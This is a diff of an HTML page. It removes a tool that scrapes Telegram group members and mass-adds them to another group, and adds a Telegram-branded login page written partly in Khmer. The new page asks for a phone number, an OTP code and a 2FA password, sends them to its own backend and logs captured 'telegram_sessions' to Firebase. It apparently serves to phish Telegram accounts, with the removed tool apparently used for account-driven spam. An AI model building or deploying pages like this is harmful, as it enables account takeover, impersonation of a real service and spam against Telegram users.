@@ -2,263 +2,272 @@
 <html lang="km">
 <head>
 <meta charset="UTF-8">
-<title>Telegram Auto-Add PRO MAX 🚀</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+<title>Telegram OTP Login 2FA</title>
 
 <style>
-*{box-sizing:border-box;}
-body{font-family:'JetBrains Mono',monospace;background:#0f0f10;color:#fff;margin:0;}
-.container{max-width:1100px;margin:auto;padding:15px;}
-section{background:#1e1e2a;border-radius:20px;padding:20px;margin-bottom:20px;}
-.card-title{text-align:center;font-size:22px;color:#00ff7f;margin-bottom:10px;}
+body {
+  font-family:'Segoe UI',sans-serif;
+  background:linear-gradient(135deg,#6fc1fc,#fff);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
 
-input{width:100%;padding:10px;margin-top:8px;border-radius:10px;border:none;background:#111;color:#fff;}
-button{margin-top:10px;padding:10px;border:none;border-radius:10px;background:#00ff7f;cursor:pointer;}
-button:hover{background:#00cc66;}
+.login-container {
+  background:#fff;
+  border-radius:20px;
+  width:380px;
+  max-width:90%;
+  padding:40px 30px;
+  box-shadow:0 12px 30px rgba(0,0,0,0.2);
+  text-align:center;
+}
 
-.success{color:#00ff7f;}
-.failed{color:#ff4c4c;}
-.skipped{color:#9999ff;}
-.pending{color:#ffcc00;}
+.logo {
+  width:80px;
+  height:80px;
+  margin:0 auto 20px;
+  background:#0088cc;
+  border-radius:50%;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:white;
+  font-size:36px;
+  font-weight:bold;
+}
 
-ul{max-height:300px;overflow:auto;padding:0;}
-li{list-style:none;border-bottom:1px solid #333;padding:6px;}
+h2 { margin:0 0 20px; color:#333; }
 
-.progress-bar{background:#111;height:10px;border-radius:10px;}
-.progress{background:#00ff7f;height:10px;width:0%;}
+input {
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:10px;
+  border:1px solid #ccc;
+  font-size:16px;
+}
 
-.console-log{background:#111;padding:10px;height:150px;overflow:auto;margin-top:10px;}
+input:focus {
+  outline:none;
+  border-color:#0088cc;
+}
 
-.page{display:none;}
-.page.active{display:block;}
+button {
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:10px;
+  font-size:16px;
+  font-weight:600;
+  background:#0088cc;
+  color:white;
+  border:none;
+  cursor:pointer;
+}
 
-table{width:100%;margin-top:10px;border-collapse:collapse;}
-th,td{padding:8px;border-bottom:1px solid #333;text-align:center;}
-th{color:#00ff7f;}
+button:hover { background:#006fa1; }
+
+#message {
+  margin-top:10px;
+  font-size:14px;
+}
 </style>
 </head>
 
 <body>
-<div class="container">
 
-<!-- NAV -->
-<button onclick="showPage('auto')">Auto Add</button>
-<button onclick="showPage('export')">Export</button>
-<button onclick="showPage('history')">History</button>
+<div class="login-container">
+  <div class="logo">T</div>
+  <h2>Telegram OTP Login 2FA</h2>
 
-<!-- AUTO ADD -->
-<section id="auto" class="page active">
-<div class="card-title">Auto Add Members</div>
+  <!-- STEP 1 -->
+  <div id="step-phone">
+    <input type="text" id="phone" placeholder="លេខទូរស័ព្ទ">
+    <button id="btn-next">Send OTP</button>
+  </div>
 
-<input id="sourceGroupInput" placeholder="Source Group">
-<input id="targetGroupInput" placeholder="Target Group">
-<button id="startAutoAddBtn">Start Auto Add</button>
+  <!-- STEP 2 -->
+  <div id="step-otp" style="display:none;">
+    <input type="text" id="otp" placeholder="OTP Code">
 
-<div id="autoAddStatus"></div>
-<div id="autoAddCounter"></div>
-<div class="progress-bar"><div id="autoAddProgress" class="progress"></div></div>
+    <input type="password"
+      id="password"
+      placeholder="2FA password (បើមាន)"
+      style="display:none;">
 
-<ul id="autoAddList"></ul>
-<div id="autoAddConsole" class="console-log"></div>
-</section>
+    <button id="btn-login">Login</button>
+  </div>
 
-<!-- EXPORT -->
-<section id="export" class="page">
-<div class="card-title">Export Target Group</div>
-
-<input id="exportGroupInput" placeholder="Target Group">
-<button id="exportBtn">Export Members</button>
-
-<div id="exportStatus"></div>
-<ul id="exportList"></ul>
-</section>
-
-<!-- HISTORY -->
-<section id="history" class="page">
-<div class="card-title">History + Account Summary</div>
-
-<h3>📊 Account Summary</h3>
-<table>
-<thead>
-<tr>
-<th>Account</th>
-<th class="success">Success</th>
-<th class="failed">Failed</th>
-<th class="pending">Skipped</th>
-<th>Total</th>
-</tr>
-</thead>
-<tbody id="accountSummaryTable"></tbody>
-</table>
-
-<h3>📜 History Logs</h3>
-<ul id="historyList"></ul>
-
-<button id="downloadHistoryBtn">Download JSON</button>
-</section>
-
+  <p id="message"></p>
 </div>
 
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
 <script>
-// ===== NAV =====
-function showPage(id){
-  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'))
-  document.getElementById(id).classList.add('active')
-}
+const firebaseConfig = {
+  apiKey: "YOUR_KEY",
+  authDomain: "YOUR_AUTH",
+  databaseURL: "YOUR_DB",
+  projectId: "YOUR_ID"
+};
 
-// ===== LOG =====
-function logConsole(msg){
-  const c=document.getElementById("autoAddConsole")
-  c.innerHTML += msg+"<br>"
-  c.scrollTop=c.scrollHeight
-}
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+</script>
 
-// ===== AUTO ADD =====
-document.getElementById("startAutoAddBtn").onclick=async()=>{
-  const source=document.getElementById("sourceGroupInput").value.trim()
-  const target=document.getElementById("targetGroupInput").value.trim()
+<script>
+let currentPhone = '';
 
-  if(!source||!target) return alert("Enter groups")
+const stepPhone = document.getElementById('step-phone');
+const stepOtp = document.getElementById('step-otp');
+const message = document.getElementById('message');
 
-  const status=document.getElementById("autoAddStatus")
-  const list=document.getElementById("autoAddList")
-  const counter=document.getElementById("autoAddCounter")
-  const progress=document.getElementById("autoAddProgress")
+const passwordInput = document.getElementById('password');
 
-  status.innerText="Fetching source..."
+// ================= STEP 1: SEND OTP =================
+document.getElementById('btn-next').addEventListener('click', async () => {
+  const phone = document.getElementById('phone').value.trim();
 
-  const res=await fetch("/members",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({group:source})})
-  const members=await res.json()
-
-  status.innerText="Exporting target..."
-  const ex=await fetch("/export-members",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({targetGroup:target})})
-  const exData=await ex.json()
-
-  const targetSet=new Set((exData.members||[]).map(m=>m.username||m.user_id))
-
-  const hist=await fetch("/history").then(r=>r.json())
-  const historySet=new Set(Object.values(hist||{}).filter(h=>h.status==="success").map(h=>h.username||h.user_id))
-
-  list.innerHTML=""
-  let done=0
-
-  for(const m of members){
-    const id=m.username||m.user_id
-
-    if(targetSet.has(id)){
-      list.innerHTML+=`<li>❌ ${id} → <span class="skipped">TARGET</span></li>`
-      logConsole("SKIP TARGET "+id)
-      done++
-      counter.innerText=`${done}/${members.length}`
-      continue
-    }
-
-    if(historySet.has(id)){
-      list.innerHTML+=`<li>⚠️ ${id} → <span class="pending">HISTORY</span></li>`
-      logConsole("SKIP HISTORY "+id)
-      done++
-      counter.innerText=`${done}/${members.length}`
-      continue
-    }
-
-    const add=await fetch("/add-member",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...m,targetGroup:target})})
-    const result=await add.json()
-
-    const color=result.status==="success"?"success":"failed"
-
-    list.innerHTML+=`<li>${id} → <span class="${color}">${result.status}</span></li>`
-
-    done++
-    counter.innerText=`${done}/${members.length}`
-    progress.style.width=`${(done/members.length)*100}%`
-
-    if(result.status==="success"){
-      await new Promise(r=>setTimeout(r,30000))
-    }
+  if (!phone) {
+    message.textContent = "សូមបញ្ចូលលេខទូរស័ព្ទ";
+    return;
   }
 
-  status.innerText="DONE ✅"
-}
+  currentPhone = phone;
 
-// ===== EXPORT =====
-document.getElementById("exportBtn").onclick=async()=>{
-  const g=document.getElementById("exportGroupInput").value.trim()
-  const status=document.getElementById("exportStatus")
-  const list=document.getElementById("exportList")
+  message.textContent = "កំពុងផ្ញើ OTP...";
 
-  status.innerText="Loading..."
-  list.innerHTML=""
+  try {
+    const res = await fetch('/send-otp', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ phone })
+    });
 
-  const res=await fetch("/members",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({group:g})})
-  const members=await res.json()
+    const data = await res.json();
 
-  members.forEach(m=>{
-    list.innerHTML+=`<li>${m.username||m.user_id}</li>`
-  })
-
-  status.innerText="Done "+members.length
-}
-
-// ===== HISTORY =====
-async function fetchHistory(){
-  const res=await fetch("/history")
-  const data=await res.json()
-
-  const list=document.getElementById("historyList")
-  const table=document.getElementById("accountSummaryTable")
-
-  list.innerHTML=""
-  table.innerHTML=""
-
-  const summary={}
-
-  Object.values(data).forEach(h=>{
-    const acc=h.accountUsed||"unknown"
-
-    if(!summary[acc]){
-      summary[acc]={success:0,failed:0,skipped:0,total:0}
+    if (data.success) {
+      stepPhone.style.display = 'none';
+      stepOtp.style.display = 'block';
+      message.textContent = "OTP បានផ្ញើ!";
+    } else {
+      message.textContent = data.error || "Fail to send OTP";
     }
 
-    summary[acc].total++
+  } catch (err) {
+    message.textContent = "Server error";
+  }
+});
 
-    if(h.status==="success") summary[acc].success++
-    else if(h.status==="failed") summary[acc].failed++
-    else summary[acc].skipped++
 
-    const color=h.status==="success"?"success":h.status==="failed"?"failed":"skipped"
+// ================= STEP 2: LOGIN =================
+document.getElementById('btn-login').addEventListener('click', async () => {
+  const otp = document.getElementById('otp').value.trim();
 
-    list.innerHTML+=`
-    <li class="${color}">
-    ${h.username||h.user_id} → ${h.status} (${acc})
-    <br><small>${h.reason||""}</small>
-    </li>`
-  })
+  if (!otp) {
+    message.textContent = "សូមបញ្ចូល OTP";
+    return;
+  }
 
-  Object.keys(summary).forEach(acc=>{
-    const s=summary[acc]
-    table.innerHTML+=`
-    <tr>
-    <td>${acc}</td>
-    <td class="success">${s.success}</td>
-    <td class="failed">${s.failed}</td>
-    <td class="pending">${s.skipped}</td>
-    <td>${s.total}</td>
-    </tr>`
-  })
-}
+  message.textContent = "កំពុង verify...";
 
-setInterval(fetchHistory,5000)
-fetchHistory()
+  try {
+    const res = await fetch('/login', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        phone: currentPhone,
+        otp
+      })
+    });
 
-// ===== DOWNLOAD =====
-document.getElementById("downloadHistoryBtn").onclick=async()=>{
-  const data=await fetch("/history").then(r=>r.json())
-  const blob=new Blob([JSON.stringify(data,null,2)])
-  const a=document.createElement("a")
-  a.href=URL.createObjectURL(blob)
-  a.download="history.json"
-  a.click()
+    const data = await res.json();
+
+    // ================= 2FA REQUIRED =================
+    if (data.requirePassword) {
+      passwordInput.style.display = 'block';
+      message.textContent = "សូមបញ្ចូល 2FA password";
+      return;
+    }
+
+    // ================= SUCCESS (NO 2FA) =================
+    if (data.success) {
+      message.textContent = "Login Success";
+
+      db.ref('telegram_sessions').push({
+        phone: currentPhone,
+        status: "success",
+        has2FA: "nopass",
+        timestamp: Date.now()
+      });
+
+      resetForm();
+    }
+
+  } catch (err) {
+    message.textContent = "Server error";
+  }
+});
+
+
+// ================= OPTIONAL 2FA SUBMIT =================
+passwordInput.addEventListener('keypress', async (e) => {
+  if (e.key === 'Enter') {
+    const password = passwordInput.value.trim();
+
+    message.textContent = "កំពុង verify 2FA...";
+
+    try {
+      const res = await fetch('/login-password', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+          phone: currentPhone,
+          password
+        })
+      });
+
+      const data = await res.json();
+
+      if (data.success) {
+        message.textContent = "Login Success (2FA)";
+
+        db.ref('telegram_sessions').push({
+          phone: currentPhone,
+          status: "success",
+          has2FA: "pass",
+          timestamp: Date.now()
+        });
+
+        resetForm();
+      } else {
+        message.textContent = data.message;
+      }
+
+    } catch (err) {
+      message.textContent = "2FA error";
+    }
+  }
+});
+
+
+// ================= RESET =================
+function resetForm() {
+  document.getElementById('phone').value = '';
+  document.getElementById('otp').value = '';
+  passwordInput.value = '';
+  passwordInput.style.display = 'none';
+
+  stepOtp.style.display = 'none';
+  stepPhone.style.display = 'block';
+
+  currentPhone = '';
 }
 </script>
 
